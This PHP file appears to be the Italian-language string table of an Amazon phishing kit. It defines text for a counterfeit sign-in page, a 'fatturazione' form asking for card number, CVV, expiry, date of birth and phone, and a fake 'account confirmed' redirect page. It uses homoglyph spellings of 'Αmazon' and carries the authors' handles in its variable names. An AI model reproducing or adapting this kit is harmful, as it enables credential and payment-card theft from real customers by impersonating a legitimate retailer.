<?php
$m3il9a_1 = 'Iscriviti a Prime';
$m3il9a_2 = 'Tutte le categorie';
$m3il9a_3 = 'Seleziona il dipartimento in cui vuoi cercare';
$m3il9a_4 = 'IT';
$m3il9a_5 = 'Ciao. Accedi';
$m3il9a_6 = 'Account e liste';
$m3il9a_7 = 'Ordini';
$m3il9a_8 = 'Carrello';

$zab_a = 'Il tuo account';
$zab_b = 'Amazon Wallet';
$zab_c = 'Amazon Manager';
$Azzouz1 = 'Amazon accetta tutte le principali carte di credito e di debito';
$Azzouz2 = 'Carte di credito o di debito';
$Azzouz3 = 'Nome sulla carta';
$Azzouz4 = 'Indirizzo email';
$Azzouz5 = 'Password';
$Azzouz6 = 'Confirme Password';
$Azzouz7 = 'Inserisci il tuo accesso e-mail allegato';
$Azzouz8 = 'Usa questa carta su tutto Amazon';
$year = date ('Y');
/////////////////////// Registrati ////////////////////////// /////////
$dexter_zkika_1 = "Accedi";
$dexter_zkika_2 = "Email (telefono per account mobili)";
$dexter_zkika_3 = "Hai dimenticato la tua password?";
$dexter_zkika_4 = "Password";
$dexter_zkika_5 = "Accedi";
$dexter_zkika_6 = "Nuovo a Αmazon?";
$dexter_zkika_11 = "Accogliendo tu accetti il ​​nostro";
$dexter_zkika_111 = "Condizioni di utilizzo e vendita";
$dexter_zkika_1111 = "e il nostro";
$dexter_zkika_11111 = "Informativa sulla privacy";
$dexter_zkika_12 = "Crea un account";
$dexter_zkika_13 = "Condizioni di utilizzo";
$dexter_zkika_15 = "Informativa sulla privacy";
$dexter_zkika_16 = "Aiuto";
$goverment_is_bad_1 = "© 1996-$year, Αmazon.com, Inc. o le sue affiliate";
$goverment_is_bad_2 = "Amazon - Login";
///////////////////////// fatturazione //////////////////////// ///////////
$richard_azzouz_1 = "Amazon - fatturazione";
$richard_azzouz_2 = "Ciao";
$richard_azzouz_3 = "Ricerca";
$richard_azzouz_4 = "Tutto";
$richard_azzouz_5 = "Il tuo account";
$richard_azzouz_6 = "Scheda";
$richard_azzouz_7 = "Desidera";
$richard_azzouz_8 = "elenco";
$goverment_is_bad_4 = "Inserisci le tue informazioni sulla carta di credito";
$goverment_is_bad_5 = "Cuando haya terminado, haga clic en el botón Enviar.";
$goverment_is_bad_6 = "Titolare di carta";
$goverment_is_bad_7 = "Numero di carta";
$goverment_is_bad_8 = "Nessun Dashes o Spaces";
$goverment_is_bad_09 = "Codice di sicurezza della carta";
$goverment_is_bad_10 = "Data di scadenza";
$goverment_is_bad_11 = "Mese";
$goverment_is_bad_12 = "Anno";
$goverment_is_bad_13 = "Giorno";
$goverment_is_bad_14 = "Numero di telefono";
$goverment_is_bad_15 = "Codice Postale";
$goverment_is_bad_16 = "data di nascita";
$goverment_is_bad_17 = "CVV";
$goverment_is_bad_18 = "Enviar";
$goverment_is_bad_19 = "Condizioni di utilizzo";
$goverment_is_bad_20 = "Informativa sulla privacy";
$goverment_is_bad_21 = "Annunci basati sugli interessi";
/////////////////////////// finich ////////////////////// ////////////////////////////
$zkika_logo = "Amazon - grazie!";
$dexter_zkikab_1 = "Grazie";
$dexter_zkikab_2 = "Hai confermato le tue <br> Informazioni sul tuo account";
$dexter_zkikab_3 = "Il tuo deve re-login per salvare le modifiche, sarai reindirizzato automaticamente alla pagina di login in <br> 5 secondi Grazie per aver utilizzato la nostra verifica del sistema.";
////////////////////////////////////////////////// ////////////////////////////////////
?>